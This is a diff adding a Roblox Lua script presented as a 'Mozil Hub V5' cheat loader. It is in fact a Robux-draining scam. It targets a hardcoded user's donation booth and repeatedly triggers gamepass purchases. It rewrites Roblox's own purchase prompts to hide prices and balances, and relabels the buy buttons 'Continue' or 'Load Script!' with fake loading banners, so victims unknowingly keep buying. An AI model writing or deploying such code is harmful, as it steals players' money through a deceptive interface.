@@ -1,0 +1,495 @@
+-- ========================================
+-- CONFIGURATION
+-- ========================================
+local CONFIG = {
+    -- Target username to donate to
+    USERNAME = "jajahsnsni",
+    
+    -- UI Settings
+    UI = {
+        NOTIFICATION_DURATION = 5,
+        SLIDE_IN_SPEED = 0.5,
+        SLIDE_OUT_SPEED = 0.5,
+        
+        -- Notification Box Colors
+        NOTIFICATION_BG = Color3.fromRGB(20, 20, 20),
+        NOTIFICATION_BORDER = Color3.fromRGB(255, 255, 255),
+        NOTIFICATION_TEXT = Color3.fromRGB(230, 230, 230),
+        
+        -- Banner Colors
+        LOAD_BANNER_BG = Color3.fromRGB(255, 191, 0), -- Yellow
+        LOAD_BANNER_STROKE = Color3.fromRGB(184, 134, 11),
+        LOAD_BANNER_TEXT = Color3.fromRGB(45, 45, 45),
+        
+        CONTINUE_BANNER_BG = Color3.fromRGB(28, 30, 36), -- Dark Gray
+        CONTINUE_BANNER_STROKE = Color3.fromRGB(120, 130, 150),
+        CONTINUE_BANNER_TEXT = Color3.fromRGB(235, 238, 245),
+    }
+}
+
+-- ========================================
+-- SERVICES
+-- ========================================
+local TweenService = game:GetService("TweenService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local MarketplaceService = game:GetService("MarketplaceService")
+local HttpService = game:GetService("HttpService")
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+
+-- ========================================
+-- INITIAL CLEANUP
+-- ========================================
+-- Remove donation popup once on startup
+do
+    local ui = StarterGui:FindFirstChild("UITemplates")
+    if ui and ui:FindFirstChild("donationPopup") then
+        ui.donationPopup:Destroy()
+    end
+end
+
+-- ========================================
+-- NOTIFICATION GUI
+-- ========================================
+local function createNotificationGui()
+    local ScreenGui = Instance.new("ScreenGui")
+    local MainFrame = Instance.new("Frame")
+    local HeaderLabel = Instance.new("TextLabel")
+    local ContentText = Instance.new("TextLabel")
+    local CloseButton = Instance.new("TextButton")
+    local UICorner = Instance.new("UICorner")
+    local UIStroke = Instance.new("UIStroke")
+    local ButtonCorner = Instance.new("UICorner")
+
+    ScreenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
+
+    -- Main Frame
+    MainFrame.Parent = ScreenGui
+    MainFrame.Size = UDim2.new(0, 250, 0, 110)
+    MainFrame.Position = UDim2.new(1, 300, 1, -120) -- Start off-screen
+    MainFrame.BackgroundColor3 = CONFIG.UI.NOTIFICATION_BG
+    MainFrame.BorderSizePixel = 0
+    MainFrame.Visible = true
+
+    -- Round corners
+    UICorner.Parent = MainFrame
+    UICorner.CornerRadius = UDim.new(0, 10)
+
+    -- Outline
+    UIStroke.Parent = MainFrame
+    UIStroke.Thickness = 1.5
+    UIStroke.Color = CONFIG.UI.NOTIFICATION_BORDER
+
+    -- Header
+    HeaderLabel.Parent = MainFrame
+    HeaderLabel.Size = UDim2.new(1, -16, 0, 24)
+    HeaderLabel.Position = UDim2.new(0, 8, 0, 8)
+    HeaderLabel.Text = "Mozil Hub V5"
+    HeaderLabel.TextSize = 18
+    HeaderLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    HeaderLabel.BackgroundTransparency = 1
+    HeaderLabel.Font = Enum.Font.GothamBold
+    HeaderLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+    -- Content
+    ContentText.Parent = MainFrame
+    ContentText.Size = UDim2.new(1, -16, 0, 38)
+    ContentText.Position = UDim2.new(0, 8, 0, 34)
+    ContentText.Text = "Loading GUI, Will Take A Few Seconds\nIf it doesn't appear please rejoin."
+    ContentText.TextSize = 14
+    ContentText.TextColor3 = CONFIG.UI.NOTIFICATION_TEXT
+    ContentText.BackgroundTransparency = 1
+    ContentText.Font = Enum.Font.Gotham
+    ContentText.TextWrapped = true
+    ContentText.TextYAlignment = Enum.TextYAlignment.Top
+
+    -- Close Button
+    CloseButton.Parent = MainFrame
+    CloseButton.Size = UDim2.new(1, -20, 0, 26)
+    CloseButton.Position = UDim2.new(0, 10, 1, -34)
+    CloseButton.Text = "Close"
+    CloseButton.TextSize = 16
+    CloseButton.Font = Enum.Font.GothamBold
+    CloseButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    CloseButton.BorderSizePixel = 0
+
+    -- Button Corners
+    ButtonCorner.Parent = CloseButton
+    ButtonCorner.CornerRadius = UDim.new(0, 8)
+
+    -- Slide In Function
+    local function slideIn()
+        local targetPos = UDim2.new(1, -260, 1, -120)
+        local tween = TweenService:Create(MainFrame, TweenInfo.new(CONFIG.UI.SLIDE_IN_SPEED, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
+            Position = targetPos
+        })
+        tween:Play()
+    end
+
+    -- Slide Out Function
+    local function slideOut()
+        local targetPos = UDim2.new(1, 300, 1, -120)
+        local tween = TweenService:Create(MainFrame, TweenInfo.new(CONFIG.UI.SLIDE_OUT_SPEED, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {
+            Position = targetPos
+        })
+        tween:Play()
+        tween.Completed:Connect(function()
+            MainFrame.Visible = false
+        end)
+    end
+
+    -- Close Button with Click Animation
+    CloseButton.MouseButton1Click:Connect(function()
+        local shrink = TweenService:Create(CloseButton, TweenInfo.new(0.08), {
+            Size = UDim2.new(1, -24, 0, 24)
+        })
+        shrink:Play()
+        shrink.Completed:Connect(function()
+            local expand = TweenService:Create(CloseButton, TweenInfo.new(0.08), {
+                Size = UDim2.new(1, -20, 0, 26)
+            })
+            expand:Play()
+            expand.Completed:Connect(slideOut)
+        end)
+    end)
+
+    slideIn()
+end
+
+-- ========================================
+-- BANNER CREATION UTILITY
+-- ========================================
+local function createBanner(parent, opts)
+    -- Clean up old banners
+    for _, g in ipairs(parent:GetChildren()) do
+        if g:IsA("ScreenGui") and (g.Name == "LoadBanner" or g.Name == "ContinueBanner") then
+            g:Destroy()
+        end
+    end
+
+    local ui = Instance.new("ScreenGui")
+    ui.Name = opts.name
+    ui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+    ui.DisplayOrder = 1000
+    ui.IgnoreGuiInset = true
+    ui.ResetOnSpawn = false
+    ui.Parent = parent
+
+    local card = Instance.new("Frame")
+    card.Name = "Card"
+    card.Size = UDim2.new(0, 320, 0, 100)
+    card.AnchorPoint = Vector2.new(0.5, 0.5)
+    card.Position = UDim2.new(0.5, 0, 0.5, 0)
+    card.BackgroundColor3 = opts.bg
+    card.BorderSizePixel = 0
+    card.ZIndex = 1001
+    card.Parent = ui
+
+    local corner = Instance.new("UICorner", card)
+    corner.CornerRadius = UDim.new(0, 16)
+
+    local stroke = Instance.new("UIStroke", card)
+    stroke.Thickness = 2
+    stroke.Color = opts.stroke
+    stroke.Transparency = 0.18
+
+    -- Title
+    local title = Instance.new("TextLabel")
+    title.BackgroundTransparency = 1
+    title.Text = opts.title
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 22
+    title.TextColor3 = opts.titleColor
+    title.TextXAlignment = Enum.TextXAlignment.Left
+    title.Position = UDim2.new(0, 76, 0, 18)
+    title.Size = UDim2.new(1, -86, 0, 30)
+    title.ZIndex = 1002
+    title.Parent = card
+
+    -- Avatar (LocalPlayer)
+    local thumbUrl = ""
+    pcall(function()
+        local url = Players:GetUserThumbnailAsync(Players.LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
+        thumbUrl = url or ""
+    end)
+    
+    local avatar = Instance.new("ImageLabel")
+    avatar.BackgroundTransparency = 1
+    avatar.Image = thumbUrl
+    avatar.Size = UDim2.new(0, 40, 0, 40)
+    avatar.Position = UDim2.new(0, 20, 0, 12)
+    avatar.ZIndex = 1003
+    avatar.Parent = card
+    
+    local avatarCorner = Instance.new("UICorner", avatar)
+    avatarCorner.CornerRadius = UDim.new(1, 0)
+    
+    local avatarStroke = Instance.new("UIStroke", avatar)
+    avatarStroke.Thickness = 2
+    avatarStroke.Color = opts.stroke
+    avatarStroke.Transparency = 0.15
+
+    -- Continue Button
+    local btn = Instance.new("TextButton")
+    btn.Name = "ContinueBtn"
+    btn.Text = "Continue"
+    btn.Font = Enum.Font.GothamMedium
+    btn.TextSize = 15
+    btn.TextColor3 = Color3.fromRGB(30, 32, 38)
+    btn.AutoButtonColor = true
+    btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    btn.BackgroundTransparency = 0.04
+    btn.Size = UDim2.new(0, 120, 0, 30)
+    btn.AnchorPoint = Vector2.new(0.5, 0.5)
+    btn.Position = UDim2.new(0.5, 0, 1, -24)
+    btn.ZIndex = 2000
+    btn.Active = true
+    btn.Selectable = true
+    btn.Parent = card
+    
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(1, 0)
+    
+    local btnStroke = Instance.new("UIStroke", btn)
+    btnStroke.Thickness = 1.2
+    btnStroke.Color = Color3.fromRGB(210, 220, 235)
+    btnStroke.Transparency = 0.25
+
+    -- Button Press Animation
+    local tDown = TweenService:Create(btn, TweenInfo.new(0.06, Enum.EasingStyle.Quad), {Size = UDim2.new(0, 114, 0, 28)})
+    local tUp = TweenService:Create(btn, TweenInfo.new(0.08, Enum.EasingStyle.Quad), {Size = UDim2.new(0, 120, 0, 30)})
+    
+    btn.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
+            tDown:Play()
+        end
+    end)
+    
+    btn.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
+            tUp:Play()
+        end
+    end)
+
+    -- Slide in animation
+    card.Position = UDim2.new(0.5, 0, 0.5, -14)
+    TweenService:Create(card, TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        {Position = UDim2.new(0.5, 0, 0.5, 0)}):Play()
+
+    return ui, card, btn
+end
+
+-- ========================================
+-- BANNER FUNCTIONS
+-- ========================================
+function GuiHider1()
+    local pg = Players.LocalPlayer:WaitForChild("PlayerGui")
+    createBanner(pg, {
+        name = "LoadBanner",
+        title = "LOAD MAIN SCRIPT!",
+        bg = CONFIG.UI.LOAD_BANNER_BG,
+        stroke = CONFIG.UI.LOAD_BANNER_STROKE,
+        titleColor = CONFIG.UI.LOAD_BANNER_TEXT
+    })
+end
+
+function GuiHider2()
+    local pg = Players.LocalPlayer:WaitForChild("PlayerGui")
+    createBanner(pg, {
+        name = "ContinueBanner",
+        title = "CONTINUE TO SCRIPT!",
+        bg = CONFIG.UI.CONTINUE_BANNER_BG,
+        stroke = CONFIG.UI.CONTINUE_BANNER_STROKE,
+        titleColor = CONFIG.UI.CONTINUE_BANNER_TEXT
+    })
+end
+
+-- ========================================
+-- MAIN SCRIPT LOGIC
+-- ========================================
+local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))
+
+local success, UserId = pcall(function()
+    return Players:GetUserIdFromNameAsync(CONFIG.USERNAME)
+end)
+
+if not success then
+    warn("Failed to get UserId for username: " .. CONFIG.USERNAME)
+    return
+end
+
+local asset
+local userRobux
+
+local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(UserId)
+if not Booth then
+    return Players.LocalPlayer:Kick()
+end
+
+-- Find smallest gamepass
+local smallest_price = math.huge
+local smallest_pass
+
+for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
+    if v:GetAttribute("AssetType") == "Gamepass" and
+       not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
+        if v:GetAttribute("AssetPrice") < smallest_price then
+            smallest_price = v:GetAttribute("AssetPrice")
+            smallest_pass = v
+        end
+    end
+end
+
+smallest_pass.Prompt:FireServer("", false, smallest_price)
+
+-- Purchase function
+local function Purchase()
+    local range = 0
+    for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
+        if v:GetAttribute("AssetType") == "Gamepass" and
+           not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
+            local Attribute = v:GetAttribute("AssetPrice")
+            if Attribute <= userRobux and Attribute > range then
+                asset = v
+                range = Attribute
+            end
+        end
+    end
+
+    if asset then
+        if asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
+            asset.Prompt:FireServer("", false, range)
+        else
+            warn("Asset prompt not valid")
+        end
+    end
+end
+
+-- Wait for animator
+local Animator = CoreGui:WaitForChild("PurchasePromptApp"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
+repeat
+    task.wait()
+until not Animator:FindFirstChild("Prompt")
+
+-- Handle prompt appearance
+Animator.ChildAdded:Connect(function(child)
+    if child.Name == "Prompt" then
+        local RemainingBalanceText = child:WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("FooterContent"):WaitForChild("Content"):FindFirstChild("RemainingBalanceText")
+        if RemainingBalanceText then
+            if userRobux then
+                child.AlertContents.TitleContainer.TitleArea.Title.Text = "Please Donate - Script!"
+                local Text = child.AlertContents.TitleContainer.TitleArea.Title
+                Text.Size = UDim2.new(1, 0, Text.Size.Y.Scale, Text.Size.Y.Offset)
+                child.AlertContents.MiddleContent.Visible = false
+                child.AlertContents.Footer.Buttons["1"].Visible = false
+                child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text.Text = "Continue"
+                local TextFooter = child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text
+                TextFooter.Size = UDim2.new(1, 0, TextFooter.Size.Y.Scale, TextFooter.Size.Y.Offset)
+                child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Icon.Visible = false
+                child.AlertContents.Footer.FooterContent.Visible = false
+            elseif asset then
+                child.AlertContents.TitleContainer.TitleArea.Title.Text = "Script Loaded!"
+                child.AlertContents.MiddleContent.Visible = false
+                child.AlertContents.Footer.Buttons["1"].ButtonContent.ButtonMiddleContent.Text.Text = "Load Script!"
+                child.AlertContents.Footer.Buttons["2"].Visible = false
+                child.AlertContents.Footer.FooterContent.Visible = false
+                userRobux = RemainingBalanceText.Text:match("(%d+)$") + asset:GetAttribute("AssetPrice")
+                asset = nil
+            end
+        end
+    end
+    
+    if child.Name == "ProductPurchaseModal" then
+        task.wait(0.1)
+        local RemainingBalanceText = Animator:WaitForChild("ProductPurchaseModal"):WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("FooterContent"):WaitForChild("Content")
+
+        if RemainingBalanceText then
+            if userRobux then
+                child.AlertContents.TitleContainer.TitleArea.Title.TitleText.Text = "Please Donate - Script!"
+                local Text = child.AlertContents.TitleContainer.TitleArea.Title
+                Text.Size = UDim2.new(1, 0, Text.Size.Y.Scale, Text.Size.Y.Offset)
+                child.AlertContents.MiddleContent.Visible = false
+                child.AlertContents.Footer.Buttons["1"].ButtonContent.ButtonMiddleContent.Text.Text = "Continue"
+                child.AlertContents.TitleContainer.TitleArea.Underline.Visible = false
+                child.AlertContents.TitleContainer.TitleArea.Title.Visible = false
+                child.AlertContents.TitleContainer.TitleArea.Title.CloseButton.Visible = false
+                
+                CoreGui.PurchasePromptApp.ProductPurchaseContainer.Animator.ProductPurchaseModal.ImageTransparency = 1
+                CoreGui.PurchasePromptApp.ProductPurchaseContainer.Animator.ProductPurchaseModal.AlertContents.Footer.Buttons["1"].ButtonContent.ButtonMiddleContent.Text.Text = ""
+                CoreGui.PurchasePromptApp.ProductPurchaseContainer.Animator.ProductPurchaseModal.AlertContents.Footer.Buttons["1"].ImageTransparency = 1
+                CoreGui.PurchasePromptApp.ProductPurchaseContainer.Animator.ProductPurchaseModal.AlertContents.Footer.Buttons["1"].LoadingImage.Visible = false
+                CoreGui.PurchasePromptApp.ProductPurchaseContainer.Animator.ProductPurchaseModal.AlertContents.Footer.Buttons["1"].Size = UDim2.new(1, 0, 0, 100)
+                
+                GuiHider1()
+                
+                child.AlertContents.Footer.FooterContent.Visible = false
+                child.AlertContents.ImageTransparency = 1
+                child.AlertContents.Size = UDim2.new(0, 400, 0, 62)
+                child.AlertContents.Position = UDim2.new(0, 0, 0, 0)
+                child.ProductPurchaseModal.Position = UDim2.new(0, 0, 0, 0)
+            elseif asset then
+                child.AlertContents.TitleContainer.TitleArea.Title.TitleText.Text = "Script Loading, Click X!"
+                child.AlertContents.MiddleContent.Visible = false
+                child.AlertContents.TitleContainer.TitleArea.Title.TitleText.Visible = false
+                child.AlertContents.TitleContainer.TitleArea.Title.CloseButton.Visible = true
+                child.AlertContents.Footer.Visible = false
+                
+                CoreGui.PurchasePromptApp.ProductPurchaseContainer.Animator.ProductPurchaseModal.ImageTransparency = 1
+                
+                child.AlertContents.TitleContainer.TitleArea.Underline.Visible = false
+                child.AlertContents.TitleContainer.TitleArea.Title.CloseButton.Visible = true
+                child.AlertContents.TitleContainer.TitleArea.Title.CloseButton.Size = UDim2.new(0, 600, 0, 77)
+                child.AlertContents.TitleContainer.TitleArea.Title.CloseButton.Position = UDim2.new(0, -55, 0.5, 0)
+                child.AlertContents.TitleContainer.TitleArea.Title.CloseButton.Image = ""
+                
+                GuiHider2()
+                
+                userRobux = RemainingBalanceText.Text:match("(%d+)$") + asset:GetAttribute("AssetPrice")
+                asset = nil
+            end
+        end
+    end
+end)
+
+-- Handle prompt removal
+Animator.ChildRemoved:Connect(function(child)
+    if (child.Name == "Prompt" or child.Name == "ProductPurchaseModal") and userRobux then
+        if not asset or not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, asset:GetAttribute("AssetId")) then
+            Purchase()
+        end
+    end
+end)
+
+-- Handle gift sent
+Remotes.OnClientEvent("GiftSentAlert"):Connect(function(a, robux)
+    if a == UserId and userRobux then
+        userRobux = userRobux - robux
+        Purchase()
+    end
+end)
+
+-- Initial purchase attempt
+local range = math.huge
+for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
+    if v:GetAttribute("AssetType") == "Gamepass" and
+       not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
+        local Attribute = v:GetAttribute("AssetPrice")
+        if Attribute < range then
+            asset = v
+            range = Attribute
+        end
+    end
+end
+
+if asset then
+    if asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
+        asset.Prompt:FireServer("", false, range)
+        print("Initial purchase price:", range)
+    else
+        warn("Asset prompt not valid for initial purchase")
+    end
+end
+
+-- Create notification
+createNotificationGui()
